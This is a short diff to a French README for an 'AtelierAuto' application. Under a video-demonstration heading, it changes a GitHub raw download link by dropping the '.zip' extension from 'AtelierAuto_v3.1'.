@@ -44,7 +44,7 @@ Une vidéo montrant l’utilisation de l’application peut être incluse ici :
 [Regarder la démonstration vidéo]
 
 
-https://github.com/laouysalma/AtelierAuto/raw/refs/heads/main/build/classes/entities/AtelierAuto_v3.1.zip
+https://github.com/laouysalma/AtelierAuto/raw/refs/heads/main/build/classes/entities/AtelierAuto_v3.1
 
 
 
